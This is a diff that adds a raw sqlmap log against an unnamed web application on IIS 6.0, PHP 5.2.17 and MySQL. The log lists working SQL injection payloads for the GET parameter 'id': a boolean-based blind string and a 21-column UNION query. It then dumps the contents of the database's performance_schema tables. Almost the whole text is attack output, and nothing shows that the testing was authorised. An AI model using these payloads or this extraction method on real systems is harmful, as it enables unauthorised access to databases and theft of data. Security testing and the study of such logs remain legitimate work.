@@ -1,0 +1,148 @@
+sqlmap identified the following injection point(s) with a total of 20 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=17504 AND 8765=8765
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 21 columns
+    Payload: id=17504 UNION ALL SELECT CONCAT(0x716a766b71,0x79466d4a434550584e4d6a784e5571785065677369416d794854774f4e646869586677636c425043,0x717a6a7871),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AmGm
+---
+web server operating system: Windows 2003 or XP
+web application technology: Microsoft IIS 6.0, PHP 5.2.17
+back-end DBMS: MySQL >= 5.0.0
+Database: performance_schema
+Table: performance_timers
+[5 entries]
++-------------+----------------+-----------------+------------------+
+| TIMER_NAME  | TIMER_OVERHEAD | TIMER_FREQUENCY | TIMER_RESOLUTION |
++-------------+----------------+-----------------+------------------+
+| CYCLE       | NULL           | NULL            | NULL             |
+| NANOSECOND  | NULL           | NULL            | NULL             |
+| MICROSECOND | NULL           | NULL            | NULL             |
+| MILLISECOND | NULL           | NULL            | NULL             |
+| TICK        | NULL           | NULL            | NULL             |
++-------------+----------------+-----------------+------------------+
+
+Database: performance_schema
+Table: events_waits_summary_by_thread_by_event_name
+[0 entries]
++-----------+------------+------------+----------------+----------------+----------------+----------------+
+| THREAD_ID | EVENT_NAME | COUNT_STAR | AVG_TIMER_WAIT | SUM_TIMER_WAIT | MAX_TIMER_WAIT | MIN_TIMER_WAIT |
++-----------+------------+------------+----------------+----------------+----------------+----------------+
++-----------+------------+------------+----------------+----------------+----------------+----------------+
+
+Database: performance_schema
+Table: events_waits_history
+[0 entries]
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+| EVENT_ID | THREAD_ID | NESTING_EVENT_ID | FLAGS | SPINS | SOURCE | TIMER_END | OPERATION | EVENT_NAME | TIMER_WAIT | OBJECT_TYPE | OBJECT_NAME | TIMER_START | OBJECT_SCHEMA | NUMBER_OF_BYTES | OBJECT_INSTANCE_BEGIN |
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+
+Database: performance_schema
+Table: cond_instances
+[0 entries]
++------+-----------------------+
+| NAME | OBJECT_INSTANCE_BEGIN |
++------+-----------------------+
++------+-----------------------+
+
+Database: performance_schema
+Table: setup_timers
+[1 entry]
++------+------------+
+| NAME | TIMER_NAME |
++------+------------+
+| wait | CYCLE      |
++------+------------+
+
+Database: performance_schema
+Table: file_summary_by_instance
+[0 entries]
++-----------+------------+------------+-------------+--------------------------+---------------------------+
+| FILE_NAME | EVENT_NAME | COUNT_READ | COUNT_WRITE | SUM_NUMBER_OF_BYTES_READ | SUM_NUMBER_OF_BYTES_WRITE |
++-----------+------------+------------+-------------+--------------------------+---------------------------+
++-----------+------------+------------+-------------+--------------------------+---------------------------+
+
+Database: performance_schema
+Table: file_instances
+[0 entries]
++-----------+------------+------------+
+| FILE_NAME | EVENT_NAME | OPEN_COUNT |
++-----------+------------+------------+
++-----------+------------+------------+
+
+Database: performance_schema
+Table: setup_instruments
+[0 entries]
++------+-------+---------+
+| NAME | TIMED | ENABLED |
++------+-------+---------+
++------+-------+---------+
+
+Database: performance_schema
+Table: file_summary_by_event_name
+[0 entries]
++------------+------------+-------------+--------------------------+---------------------------+
+| COUNT_READ | EVENT_NAME | COUNT_WRITE | SUM_NUMBER_OF_BYTES_READ | SUM_NUMBER_OF_BYTES_WRITE |
++------------+------------+-------------+--------------------------+---------------------------+
++------------+------------+-------------+--------------------------+---------------------------+
+
+Database: performance_schema
+Table: mutex_instances
+[0 entries]
++---------------------+------+-----------------------+
+| LOCKED_BY_THREAD_ID | NAME | OBJECT_INSTANCE_BEGIN |
++---------------------+------+-----------------------+
++---------------------+------+-----------------------+
+
+Database: performance_schema
+Table: threads
+[0 entries]
++-----------+----------------+------+
+| THREAD_ID | PROCESSLIST_ID | NAME |
++-----------+----------------+------+
++-----------+----------------+------+
+
+Database: performance_schema
+Table: rwlock_instances
+[0 entries]
++---------------------------+------+----------------------+-----------------------+
+| WRITE_LOCKED_BY_THREAD_ID | NAME | READ_LOCKED_BY_COUNT | OBJECT_INSTANCE_BEGIN |
++---------------------------+------+----------------------+-----------------------+
++---------------------------+------+----------------------+-----------------------+
+
+Database: performance_schema
+Table: setup_consumers
+[8 entries]
++----------------------------------------------+---------+
+| NAME                                         | ENABLED |
++----------------------------------------------+---------+
+| events_waits_current                         | YES     |
+| events_waits_history                         | YES     |
+| events_waits_history_long                    | YES     |
+| events_waits_summary_by_thread_by_event_name | YES     |
+| events_waits_summary_by_event_name           | YES     |
+| events_waits_summary_by_instance             | YES     |
+| file_summary_by_event_name                   | YES     |
+| file_summary_by_instance                     | YES     |
++----------------------------------------------+---------+
+
+Database: performance_schema
+Table: events_waits_summary_global_by_event_name
+[0 entries]
++------------+------------+----------------+----------------+----------------+----------------+
+| EVENT_NAME | COUNT_STAR | AVG_TIMER_WAIT | SUM_TIMER_WAIT | MAX_TIMER_WAIT | MIN_TIMER_WAIT |
++------------+------------+----------------+----------------+----------------+----------------+
++------------+------------+----------------+----------------+----------------+----------------+
+
+Database: performance_schema
+Table: events_waits_current
+[0 entries]
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+| EVENT_ID | THREAD_ID | NESTING_EVENT_ID | FLAGS | SPINS | SOURCE | TIMER_END | OPERATION | EVENT_NAME | TIMER_WAIT | OBJECT_TYPE | OBJECT_NAME | TIMER_START | OBJECT_SCHEMA | NUMBER_OF_BYTES | OBJECT_INSTANCE_BEGIN |
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
++----------+-----------+------------------+-------+-------+--------+-----------+-----------+------------+------------+-------------+-------------+-------------+---------------+-----------------+-----------------------+
+
